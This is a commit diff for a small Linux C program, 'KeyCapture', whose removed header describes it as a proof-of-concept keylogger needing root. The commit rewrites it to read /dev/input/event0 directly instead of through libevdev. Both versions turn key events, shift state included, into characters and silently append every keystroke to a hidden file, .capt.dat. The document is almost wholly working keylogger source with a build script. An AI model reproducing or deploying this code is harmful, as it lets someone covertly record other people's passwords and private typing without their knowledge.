bd5fda16e7f08f3f0958fdcb971fe15989ed7986
Raúl Sanguiao <velorek1@gmail.com>
2024-12-27 09:28:12 +0100

    Depedency superseded

--- build.sh
+++ build.sh
@@ -2,16 +2,9 @@
 # file: build.sh
 echo -e "\e[93mKeyCapture - Coded By v3l0r3k\e[0m"
 echo
-read -p "[+] Install LibDev libraries? (sudo required) [Y/N]: " -n 1 -r
-echo    # (optional) move to a new line
-if [[ $REPLY =~ ^[Yy]$ ]]
-then
- sudo apt-get install libevdev-dev
-fi
-echo
 echo [+] Attempting to build...
 gcc keyc.c -o keyc -levdev
-echo gcc keyc.c -o keyc -levdev
+echo gcc keyc.c -o keyc
 echo -e "Run as \e[93m./keyc\e[0m" 
 echo Enjoy it!
 
--- keyc.c
+++ keyc.c
@@ -1,43 +1,26 @@
-/* [keyc] : keycapture
- * Example of proof-of-concept Keylogger , key capture for Linux using libevdev
- * requires root.
- *
- * Requirements [libevdev]
- *  (debian-based) sudo apt-get install libevdev-dev
- * Include files obtained from repository : https://gitlab.freedesktop.org/libevdev/libevdev.git
- *  - gcc keyc.c -o keyc -levdev
- * Coded by v3l0r3k DECEMBER 2024
- * 
- * Usage (with root access):
- * - sudo ./keyc&
- * */
-
-#include "include/libevdev.h"
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <linux/input.h>
 #include <stdbool.h>
 
-#define KEY_SPACE 57
-#define KEY_ENTER 28
+#define OUTPUT_FILE ".capt.dat"
+#define MAX_KEY 127
+#define KEY_BACKSPACE 14
+#define KEY_DEL 111
 #define KEY_LEFTSHIFT 42
 #define KEY_RIGHTSHIFT 54
-#define OUTPUT_FILE ".capt.dat" //file is hidden, saved in active dir
-#define MAX_KEY 127
-#define K_BACKSPACE 14
-#define K_DEL 111
 
+// ASCII maps
 char ascii_map[MAX_KEY + 1] = {
     [2] = '1', [3] = '2', [4] = '3', [5] = '4', [6] = '5', [7] = '6', [8] = '7', [9] = '8', [10] = '9', [11] = '0',
     [12] = '-', [13] = '=', [16] = 'q', [17] = 'w', [18] = 'e', [19] = 'r', [20] = 't', [21] = 'y', [22] = 'u', [23] = 'i', [24] = 'o', [25] = 'p',
-    [26] = '[', [27] = ']', [28] = '\n',  // Enter
+    [26] = '[', [27] = ']', [28] = '\n',
     [30] = 'a', [31] = 's', [32] = 'd', [33] = 'f', [34] = 'g', [35] = 'h', [36] = 'j', [37] = 'k', [38] = 'l', [39] = ';', [40] = '\'',
     [41] = '`', [44] = 'z', [45] = 'x', [46] = 'c', [47] = 'v', [48] = 'b', [49] = 'n', [50] = 'm', [51] = ',', [52] = '.', [53] = '/',
-    [57] = ' ', // Space
-    // Add mappings for Shifted keys later (e.g., Shift+2 = '@')
+    [57] = ' ',
 };
 
-// Shifted mapping: Uppercase letters and symbols
 char shift_map[MAX_KEY + 1] = {
     [2] = '!', [3] = '@', [4] = '#', [5] = '$', [6] = '%', [7] = '^', [8] = '&', [9] = '*', [10] = '(', [11] = ')',
     [12] = '_', [13] = '+', [16] = 'Q', [17] = 'W', [18] = 'E', [19] = 'R', [20] = 'T', [21] = 'Y', [22] = 'U', [23] = 'I', [24] = 'O', [25] = 'P',
@@ -45,55 +28,48 @@ char shift_map[MAX_KEY + 1] = {
     [40] = '"', [41] = '~', [44] = 'Z', [45] = 'X', [46] = 'C', [47] = 'V', [48] = 'B', [49] = 'N', [50] = 'M', [51] = '<', [52] = '>', [53] = '?',
 };
 
-_Bool shift = false;
 int main() {
-    char ascii=0;
-    struct libevdev *dev = NULL;
-    int rc=0, fd=0;
-    FILE *output = NULL;
-    fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
+    int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
     if (fd < 0) {
-        perror("Failed to open device. Make sure you have root access.");
+        perror("Failed to open input device");
         return 1;
     }
 
-    rc = libevdev_new_from_fd(fd, &dev);
-    if (rc < 0) {
-        fprintf(stderr, "Failed to init libevdev.\n");
-        return 1;
-    }
-
-    output = fopen(OUTPUT_FILE, "a");
+    FILE *output = fopen(OUTPUT_FILE, "a");
     if (!output) {
         perror("Failed to open output file");
-        libevdev_free(dev);
         close(fd);
         return 1;
     }
 
+    struct input_event ev;
+    _Bool shift = false;
 
     while (1) {
-        struct input_event ev;
-        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
-        if (rc == 0 && ev.type == EV_KEY && ev.value >= 0) {
-        if(ev.code == 42 || ev.code == 54) //shift keys
-		  shift = true;
-  	  if(ev.code == 42 && ev.value == 0) shift = false; 
-	  if(ev.code == 54 && ev.value == 0) shift = false; 
-	if (ev.code == K_BACKSPACE && ev.value ==1) fprintf(output,"[B]");    
-	if (ev.code == K_DEL && ev.value ==1) fprintf(output,"[D]");    
-  	if (ev.code < MAX_KEY) {
-		 if (!shift) ascii = ascii_map[ev.code];
- 		   else ascii = shift_map[ev.code];
-              if (ev.value ==1 ) {
-                    fprintf(output, "%c", ascii);
-		    fflush(output);
-	    }
-	    }
-	}
+        ssize_t n = read(fd, &ev, sizeof(ev));
+        if (n != sizeof(ev)) continue;
+
+        if (ev.type == EV_KEY) {
+            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
+                shift = ev.value; // 1 = pressed, 0 = released
+            } else if (ev.value == 1) { // Key press
+                if (ev.code == KEY_BACKSPACE) {
+                    fprintf(output, "[B]");
+                } else if (ev.code == KEY_DEL) {
+                    fprintf(output, "[D]");
+                } else if (ev.code <= MAX_KEY) {
+                    char ascii = shift ? shift_map[ev.code] : ascii_map[ev.code];
+                    if (ascii) {
+                        fprintf(output, "%c", ascii);
+                    }
+                }
+                fflush(output);
+            }
+        }
     }
-    libevdev_free(dev);
+
     close(fd);
     fclose(output);
     return 0;
 }
+
